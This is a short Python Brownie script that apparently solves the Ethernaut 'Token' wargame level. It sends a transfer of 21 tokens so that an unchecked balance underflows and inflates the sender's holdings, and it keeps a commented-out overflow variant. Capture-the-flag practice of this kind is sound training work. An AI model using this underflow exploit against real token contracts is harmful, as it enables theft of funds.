from brownie import interface, accounts, config

INSTANCE_ADDRESS = "0x8D5c6BadA135ea239cE3d4A491a18b9F0eB2F390"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

ADDRESS_TO_SEND = "0x468F2866Cd6aEcf640644885F6Cad63Ff4f9BC4c"

def hack():
    # grab the Token contract Object
    instance_contract = interface.IToken(INSTANCE_ADDRESS)

    # hack the contract
    tx = instance_contract.transfer(ADDRESS_TO_SEND, 21, {"from": ACCOUNT}) 
    # tx = instance_contract.transfer(ADDRESS_TO_SEND, 2**256 + 25, {"from": ACCOUNT}) for overflow

    tx.wait(1)
        
    print(f"Contract has been hacked. Now we have {instance_contract.balanceOf(ACCOUNT)} tokens")

def main():
    hack()
